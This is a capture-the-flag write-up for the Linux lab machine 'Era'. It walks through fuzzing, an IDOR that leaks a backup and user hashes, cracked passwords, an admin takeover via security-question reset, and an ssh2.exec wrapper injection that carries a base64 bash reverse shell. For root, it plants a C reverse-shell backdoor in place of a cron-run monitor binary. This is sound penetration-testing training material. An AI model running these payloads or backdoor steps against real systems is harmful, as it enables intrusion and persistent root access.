# ERA

![](<../.gitbook/assets/Screenshot_2025 08 13_184528 removebg preview.png>)

| OS    | Difficulty | Machine | Released   |
| ----- | ---------- | ------- | ---------- |
| Linux | Medium     | Active  | 26/07/2025 |

## **Machine info**

This machine starts with web enumeration. By browsing and analyzing the target website, you discover several interesting parameters and functionalities. One of these parameters is vulnerable to Local File Inclusion (LFI), which allows reading arbitrary local files from the server.

Through deeper enumeration, you identify credentials stored on the system and use them to gain an initial foothold via an SSH2 PHP wrapper exploit. This leads to remote code execution as a low-privileged user.

Once inside, the privilege escalation phase begins. Enumeration reveals a scheduled CRON job running as **root**, which repeatedly executes `/root/initiate_monitoring.sh` and interacts with a binary located at `/opt/AV/periodic-checks/monitor`. The binary’s `.text_sig` section is extracted and likely used for integrity verification.

The key observation is that the CRON job runs very frequently, spawning multiple concurrent processes. If you can modify the monitored binary (while keeping its `.text_sig` consistent) or influence a file the script depends on, you could inject commands to escalate privileges to root.

***

## Nmap

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$ nmap -T4 -Pn -A 10.10.11.79
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

then we try to search on vulnerability in ftp but we can’t found anything

### Script Scan

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$ nmap --script=ftp* 10.10.11.79
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 2285 guesses in 604 seconds, average tps: 3.7
80/tcp open  http
```

***

## Fuzzing

add domain `era.htb` to hosts files to allow you discover this site

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$ sudo nano /etc/hosts                                  
[sudo] password for irix: 
10.10.11.79     era.htb 
## add it to hosts file
```

then we start to fuzzing using dirsearch to get a valid endpoint

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$ dirsearch -u http://era.htb/ --crawl  

Target: http://era.htb/

[11:17:00] Starting: 
[11:17:05] 301 -  178B  - /js  ->  http://era.htb/js/                       
[11:18:27] 301 -  178B  - /css  ->  http://era.htb/css/                     
[11:18:43] 301 -  178B  - /fonts  ->  http://era.htb/fonts/                 
[11:18:48] 301 -  178B  - /img  ->  http://era.htb/img/                     
[11:18:54] 403 -  564B  - /js/     

Task Completed                                                                                                                                                                                                                                              
```

but we didn’t find anything interesting. so we start to think little to collect subdomains for `era.htb`

### Subdomain Enumeration

```bash
┌──(irix㉿irix)-[~/THM/era/backup]
└─$ ffuf -u 'http://era.htb' -H 'Host: FUZZ.era.htb' -w ~/wordlist/SecLists-master/Discovery/DNS/subdomains-spanish.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /home/irix/wordlist/SecLists-master/Discovery/DNS/subdomains-spanish.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

131                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 163ms]
119                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 164ms]
128                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 166ms]
12                      [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 166ms]
106                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 166ms]
132                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 167ms]
0                       [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 169ms]
103                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 170ms]
105                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 170ms]
101                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 170ms]
116                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 170ms]
129                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 174ms]
113                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 174ms]
112                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 174ms]

```

to avoid this noise we target words number

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$  ffuf -u 'http://era.htb' -H 'Host: FUZZ.era.htb' -w ~/wordlist/SecLists-master/Discovery/DNS/subdomains-spanish.txt  -fw 4 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /home/irix/wordlist/SecLists-master/Discovery/DNS/subdomains-spanish.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 160ms]
:: Progress: [5370/5370] :: Job [1/1] :: 225 req/sec :: Duration: [0:00:49] :: Errors: 0 ::

```

we found a valid subdomain call `file.era.htb` so let’s add it to hosts file to can access it

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$ sudo nano /etc/hosts                                  
[sudo] password for irix: 
10.10.11.79     era.htb file.era.htb
## add it to hosts file
```

![image.png](../.gitbook/assets/image.png)

> **it’s have interests function**

### **Directory Enum**

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$ dirsearch -u http://file.era.htb/ --crawl 

Target: http://file.era.htb/                                
[11:39:49] 301 -  178B  - /assets  ->  http://file.era.htb/assets/          
[11:39:49] 403 -  564B  - /assets/
[11:40:12] 302 -    0B  - /download.php  ->  login.php                      
[11:40:20] 301 -  178B  - /files  ->  http://file.era.htb/files/            
[11:40:20] 403 -  564B  - /files/                                           
[11:40:20] 403 -  564B  - /files/cache/                                     
[11:40:20] 403 -  564B  - /files/tmp/                                       
[11:40:27] 403 -  564B  - /images/                                          
[11:40:27] 301 -  178B  - /images  ->  http://file.era.htb/images/          
[11:40:37] 200 -   34KB - /LICENSE                                          
[11:40:38] 200 -    9KB - /login.php                                        
[11:40:39] 200 -   70B  - /logout.php                                       
[11:40:40] 302 -    0B  - /manage.php  ->  login.php                        
[11:41:11] 200 -    3KB - /register.php                                     
[11:41:39] 302 -    0B  - /upload.php  ->  login.php                        
                                                                             
Task Completed                                                
```

we start to register on this site to discover it

<figure><img src="../.gitbook/assets/image 1.png" alt=""><figcaption></figcaption></figure>

we found endpoint allow us to upload files

{% hint style="warning" %}
we will notice after upload file, we have id for our file

in this case we will think little to test IDOR vulnerability
{% endhint %}

<figure><img src="../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>

### ID Fuzzing

so let’s fuzz in id parameter use our session

![](<../.gitbook/assets/2025 08 13_17_20_01 Kali_Linux_ _VMware_Workstation.png>)

```bash
┌──(irix㉿irix)-[~/THM/era]
└─$ seq 1 50000 > ids.txt    

┌──(irix㉿irix)-[~/THM/era]
└─$ ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w ids.txt -H 'Cookie: PHPSESSID=loef1rkb4midpe60lbtnp7b9ad' -fw 3161

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/irix/THM/era/ids.txt
 :: Header           : Cookie: PHPSESSID=loef1rkb4midpe60lbtnp7b9ad
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3161
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 291ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 261ms]

```

we found two ids may have interests things

![](<../.gitbook/assets/2025 08 13_17_23_05 Kali_Linux_ _VMware_Workstation.png>)

after download two files and unzip it we found

```bash
##########   in file 1  ##########
──(irix㉿irix)-[~/THM/era/backup]
└─$ ls
LICENSE       filedb.sqlite         initial_layout.php  logout.php    reset.php            screen-main.png     site-backup-30-08-24.zip
bg.jpg        files                 layout.php          main.png      sass                 screen-manage.png   upload.php
css           functions.global.php  layout_login.php    manage.php    screen-download.png  screen-upload.png   webfonts
download.php  index.php             login.php           register.php  screen-login.png     security_login.php

########     in file 2    #########
┌──(irix㉿irix)-[~/THM/era/sign]
└─$ ls
key.pem  signing.zip  x509.genkey

```

{% hint style="warning" %}
we found interest file call `filedb.sqlite`
{% endhint %}

```bash
┌──(irix㉿irix)-[~/THM/era/backup]
└─$ sqlite3 filedb.sqlite 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> SELECT * FROM users; 
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||

```

we start to crack these hashes

```bash
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

```bash
┌──(irix㉿irix)-[~/THM/era/backup]
└─$ john --wordlist=~/wordlist/rockyou.txt hashes 

Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
america          (eric)     
mustang          (yuri)     
2g 0:00:07:40 0.07% (ETA: 2025-08-20 19:20) 0.004346g/s 27.38p/s 110.5c/s 110.5C/s david7..zxcvbnm123
Use the "--show" option to display all of the cracked passwords reliably
Session aborted

```

we try to use this credentials in ftp and web app but we think we don’t have anything may be interested. then we will back to file call `site-backup-30-08-24.zip` to investigate in this file

after more time we found something in source code for `download.php` page

```php
elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }
```

{% hint style="warning" %}
This code checks if the show parameter is "true" and the current session user is admin (`erauser` equals 1). If the `format` parameter contains `://`, it treats it as a stream wrapper (like `php://` or `ssh2://`) and sets the response as a file download; otherwise, it returns normal HTML.

**that’s mean we could have admin account we can take LFI and try to upgrade it to RCE**
{% endhint %}

### Security question

return to web App to try to manipulate with security question

![](<../.gitbook/assets/2025 08 13_17_42_40 Kali_Linux_ _VMware_Workstation.png>)

back to `filedb.sqlite` and use admin information

![](<../.gitbook/assets/Screenshot_2025 08 13_174631.png>)

> but we get **`Incorrect answers. Please try again.`**

### Reset

return to reset function to try reset question for admin user

<figure><img src="../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
we success to reset security and we get `If the user exists, answers have been updated — redirecting…` then try login again with `login security question`
{% endhint %}

![](<../.gitbook/assets/2025 08 13_17_55_36 Kali_Linux_ _VMware_Workstation.png>)

> we will notice this is the first time we are see these files . that’s meaning we are now admin

***

## **RCE**

then we could to take admin privilege on this web app so let’s try to execute LFI

```php
http://file.era.htb/?id=1&show=true&format=php://filter/read=convert.base64-encode/resource=/etc/passwd 
```

but nothing it occur

<figure><img src="../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>

after return to our mind map we found we can replace php with ssh2

{% hint style="warning" %}
ssh2 function

* ssh2.shell://user:pass@example.com:22/xterm
* ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
* ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
* ssh2.sftp://user:pass@example.com:22/path/to/filename
{% endhint %}

```php
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuODAvNDQ0NCAwPiYxKQ==|base64%20-d|bash%27;
```

we will use penelope framework to listening

> you can use netcat but this framework have more features like you can use automated privilege escalation tools if you can download it in pwn machine

```bash
git clone https://github.com/brightio/penelope.git
cd penelope
python3 penelope.py

# f12 to Session detached to use modules in this session
```

<figure><img src="../.gitbook/assets/image 5.png" alt=""><figcaption></figcaption></figure>

> now you have user flag

***

## Root

using `linpeas` you will notice file call `monitor` run with SUID privilege and we can exploit it

<figure><img src="../.gitbook/assets/image 6.png" alt=""><figcaption></figcaption></figure>

we will notice in machine

* **`CRON -f -P`** – This is the cron daemon running in the foreground, meaning a scheduled task has been triggered.
* **`bash -c echo > /opt/AV/periodic-checks/status.log`** – The scheduled task clears the contents of the `status.log` file.
* **`objcopy --dump-section .text_sig=... /opt/AV/periodic-checks/monitor`** – Extracts the `.text_sig` section from the `/opt/AV/periodic-checks/monitor` binary, probably for integrity verification or signature checking.
* **`/root/initiate_monitoring.sh` executed multiple times (PID 25204–25213)** – This is the key point: the cron job triggers `/root/initiate_monitoring.sh`, but it runs many times in quick succession.

```bash
eric@era:/opt/AV/periodic-checks$ cat a.c 
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.80/9001 0>&1'");
    return 0;
}
eric@era:/opt/AV/periodic-checks$ 
eric@era:/opt/AV/periodic-checks$ gcc a.c -o backdoor
eric@era:/opt/AV/periodic-checks$ ls
a.c  backdoor  monitor  monitor_text_sig.bin  shell.c  status.log
eric@era:/opt/AV/periodic-checks$ objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
eric@era:/opt/AV/periodic-checks$ ls
a.c  backdoor  monitor  monitor_text_sig.bin  shell.c  status.log  text_sig
eric@era:/opt/AV/periodic-checks$ objcopy --add-section .text_sig=text_sig backdoor 
eric@era:/opt/AV/periodic-checks$ cp backdoor monitor
```

![](<../.gitbook/assets/2025 08 13_18_41_12 Kali_Linux_ _VMware_Workstation.png>)
